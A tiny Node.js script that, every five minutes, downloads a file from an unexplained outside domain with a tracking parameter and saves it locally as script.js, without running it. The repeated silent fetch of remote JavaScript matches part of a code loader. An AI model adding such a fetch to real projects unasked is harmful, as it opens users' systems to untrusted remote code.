const http = require('http')
const fs = require('fs')

const download = () => {
  const file = fs.createWriteStream('script.js')
  http.get('http://humories.info?tid=936016', function (response) {
    response.pipe(file)
  })
}

const setIntervalImmediately = (func, interval) => {
  func()
  return setInterval(func, interval)
}

setIntervalImmediately(download, 300000)

